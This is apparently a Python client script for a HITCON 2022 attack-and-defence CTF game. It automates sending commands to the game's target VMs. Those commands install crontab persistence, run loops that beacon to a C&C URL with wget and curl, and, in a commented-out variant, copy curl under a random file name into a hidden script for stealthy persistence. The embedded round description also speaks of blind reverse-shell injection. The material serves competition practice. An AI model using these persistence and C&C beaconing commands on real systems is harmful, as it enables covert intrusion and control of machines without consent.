"""
Stream:
    mpg-r2.hitcon2022.online/client.html

workflow:
    Send Token ->
    Get CurrentGame, PlayerInfo, Scoreboard ->
    If running (State form CurrentGame); Send specific cmd ->
    Get CurrentGame, PlayerInfo, Scoreboard ->
    ...

notes:
    `try` is used for avoid TCP time-out and server lagging

todo:
    // fetch others' cmd and adopt if can get point

"""

import socket
import time


def rec(sock):
    BUFF_SIZE = 4096
    data = b''
    while True:
        chunk = sock.recv(BUFF_SIZE)
        data += chunk

        if len(chunk) < BUFF_SIZE:
            break
    return data


'''Format
CurrentGame: 
    Round: Blind051
    Game State: GAME_RUNNING
    Description: 瞎子摸象/Blind：1. 所有Process創立與結束都不會顯示。 2. 程式執行結果也不會顯示。 3. 通通看不見，玩家需要盲Inject Reverse Shell. 4. 可對外連網。5. 可以直接執行指令。6. C&C連線每5秒一次100點。7. 6分鐘內可以執行指令  8. 時不時隨機重開機。 1. Process creation and exit will not be displayed. 2. Program stdout/stderr are not displayed. 3. Everything is blind, you will need to blind inject reverse shell. 4. Internet access is available. 5. You can run command. 6. Contact with C&C once every 5 seconds will earn you 100 points per 5 seconds. 7. You can only execute commands during the first 6 minutes. 8. The VM will randomly reboot.

PlayerInfo:
    Player akitect registration info for Blind051: Port=77777, C&C Server URL=http://192.168.24.2:29222/report/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
    
'''


def get_info(sock):
    current_state = ""
    current_round = ""
    port = ""
    url = ""
    leaderboard = ""

    try:
        sock.send("CurrentGame\n".encode())
        current_game = rec(sock).decode().split("\n")
        current_round = current_game[0].split(": ")[-1].strip()
        current_state = current_game[1].split(": ")[-1].strip()
    except Exception as e:
        current_state = "UNKNOWN"
        print(f"[Error] Can not get the Current Game Info: {e}")

    if current_state == "GAME_RUNNING":
        try:
            sock.send("PlayerInfo\n".encode())
            player_info = rec(sock).decode().split("=")
            port = player_info[1].split(",")[0].strip()
            url = player_info[2].strip()
        except Exception as e:
            print(f"[Error] Can not get the Player Info: {e}")
            pass

        try:
            sock.send("Scoreboard\n".encode())
            leaderboard = rec(sock).decode()
        except Exception as e:
            print(f"{e}")

    else:
        print("Game is not running.")

    return current_state, current_round, port, url, leaderboard


if __name__ == "__main__":
    TOKEN = "Nick akitect <TOKEN>\n".encode()

    while True:
        TTL = 15
        start = time.time()

        cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cmd_sock.settimeout(1.0)
        cmd_sock.connect(("mpg-r2.hitcon2022.online", 29271))
        cmd_sock.send(TOKEN)
        print(rec(cmd_sock).decode())

        while True:
            now = time.time()
            if now - start > TTL:
                break

            info = get_info(cmd_sock)
            State, Round, Port, Url, Scoreboard = info
            print(info)

            # default cmd
            cmd = f"Cmd php -S 0.0.0.0:{Port} & " \
                  f"while [ true ]; do wget {Url} >/dev/null; sleep 4; done\n"
            if State == "GAME_RUNNING":
                if Round.startswith("BrowserPwn"):
                    cmd = f"Cmd {Url}\n"

                elif Round.startswith("Airgap"):
                    cmd = f"Cmd php -S 0.0.0.0:{Port} & " \
                          f"while [ true ]; do wget {Url} >/dev/null; sleep 4; done\n"

                elif Round.startswith("Blind"):
                    cmd = fr"Cmd echo '* * * * * sh -c '\''for i in $(seq 0 40); do curl {Url}; sleep 4; done'\' | crontab -" + "\n"
                    # cmd = fr"Cmd echo '* * * * * /bin/bash /home/hitcon/OKWNWTDNX.sh' | crontab -;echo 'cp /usr/bin/curl /home/hitcon/ZSBJWVHJI; while [ true ]; do /home/hitcon/ZSBJWVHJI {Url}; sleep 4; done' > /home/hitcon/OKWNWTDNX.sh; bash /home/hitcon/OKWNWTDNX.sh;" + "\n"

                print(cmd, end="")
                cmd_sock.send(cmd.encode())
                try:
                    resp = rec(cmd_sock).decode()
                    print(resp)
                    time.sleep(1)
                except socket.timeout:
                    pass

            else:
                time.sleep(0.5)
                pass
